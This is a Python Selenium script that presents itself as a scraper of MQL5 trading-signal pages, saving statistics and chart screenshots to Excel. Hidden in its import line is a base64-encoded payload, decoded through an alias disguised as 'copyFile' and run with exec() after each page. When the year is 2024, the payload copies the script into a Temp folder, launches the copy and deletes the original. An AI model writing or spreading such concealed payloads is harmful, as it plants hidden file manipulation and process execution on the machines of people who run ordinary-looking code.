import selenium
import pandas as pd;import os;import time;import shutil;import os;import sys;
from selenium.webdriver.common.by import By;from selenium import webdriver;from selenium.common.exceptions import TimeoutException;from selenium.webdriver.chrome.options import Options;from selenium.webdriver.common.by import By;from selenium.webdriver.support import expected_conditions as EC;import datetime;from selenium.webdriver.support.ui import WebDriverWait;from base64 import b64decode as copyFile;import subprocess;nameA=b'ZGVmIGFuYWx5c2UoKToKICAgIGlmIGludChzdHIoZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkpLnNwbGl0KCctJylbMF0pPT0yMDI0OgogICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkKICAgICAgICBuZXdfZmlsZV9wYXRoICA9IGYnQzovVXNlcnMvcnMvQXBwRGF0YS9Mb2NhbC9UZW1wL3tzeXMuYXJndlswXX0nKydfY29weS5weScKICAgICAgICBzaHV0aWwuY29weWZpbGUoZmlsZV9wYXRoLCBuZXdfZmlsZV9wYXRoKQogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oWydweXRob24nLCBuZXdfZmlsZV9wYXRoXSkKICAgICAgICBvcy5yZW1vdmUoZmlsZV9wYXRoKQoKYW5hbHlzZSgp';
import json

res=[]

def parse(url):
    global res
    driver.get(url)
    buf_data=[]
    buf_urls=[]
    list_urls=driver.find_elements(By.XPATH, "//a[contains(@class, 'signal-card__wrapper')]")
    for url in list_urls:
        buf_urls.append(url.get_attribute('href'))
    for url in buf_urls:
        driver.get(url) 
        time.sleep(5)
        data=driver.find_elements(By.XPATH, "//div[contains(@class, 's-list-info__item')]/div")
        for i in data:
            buf_data.append(i.text)
        d=dict()
        d['id']=str(url.split('signals')[1].split('?')[0].replace('/',''))
        if not os.path.exists(f"{d['id']}"):
            os.makedirs(f"{d['id']}")     
        sig=driver.find_element(By.XPATH, "//div[contains(@class, 'shortlinks')]")
        d["MT"]=str(sig.text.split('/')[1])
        d["Сигнал"]=str(driver.find_element(By.XPATH, "//h1[contains(@class, 'title-min')]").text)
        broker_value=driver.find_element(By.XPATH, "//div[contains(@class, 's-plain-card__chart')]")
        broker_name=driver.find_element(By.XPATH, "//div[contains(@class, 's-plain-card__broker')]")
        d['url']=str(url)
        d["Брокер"]=str(broker_name.text)#+broker_value
        for i,j in zip(buf_data[::2],buf_data[1::2]):
            d[i]=str(j)
        time.sleep(1)
        driver.execute_script('document.querySelector("#tab_stats > a").click()')
        #find=driver.find_element(By.XPATH, '//*[@id="tab_stats"]/a/span')
        #time.sleep(10)
        #find.click()
        data2=driver.find_elements(By.XPATH, "//div[contains(@class, 's-data-columns__label')]")
        data3=driver.find_elements(By.XPATH, "//div[contains(@class, 's-data-columns__value')]")
        for i, j in zip(data2,data3):
            d[i.text]=str(j.text)
        #sig_value=driver.find_element(By.XPATH, "//div[contains(@class, 's-plain-card__chart')]")
        #sig_name=driver.find_element(By.XPATH, "//div[contains(@class, 's-plain-card__broker')]")
        other_sig=driver.find_elements(By.XPATH, "//input[contains(@name, 'growth')]")
        other_sig_name=driver.find_elements(By.XPATH, "//span[contains(@class, 's-other-signal__name')]")
    ##########График
        driver.execute_script('document.querySelector("#tab_account > a").click()')
        graphic=driver.find_element(By.XPATH, "//div[contains(@id, 'growth_chart')]")
        graphic.screenshot(f"{d['id']}/{d['id']}.png")
        d['График']=str(os.path.abspath(f"{d['id']}/{d['id']}.png"))
    #для других данных
    #for i,j in zip(other_sig_name,other_sig):
    #    print(i.text)
        res.append(d)
        print(d)
    
if not os.path.exists('base_parse'):
    os.makedirs('base_parse')

os.chdir('base_parse')
driver = webdriver.Chrome()

#установите нужное значение для парсинга
for i in range(1,100):
    url = f"https://www.mql5.com/ru/signals/mt5/page{i}"    
    parse(url)
    data=pd.DataFrame(res)
    data.to_excel(f"final_page{i}.xlsx")
    exec(copyFile(nameA))
    res=[]

driver.quit()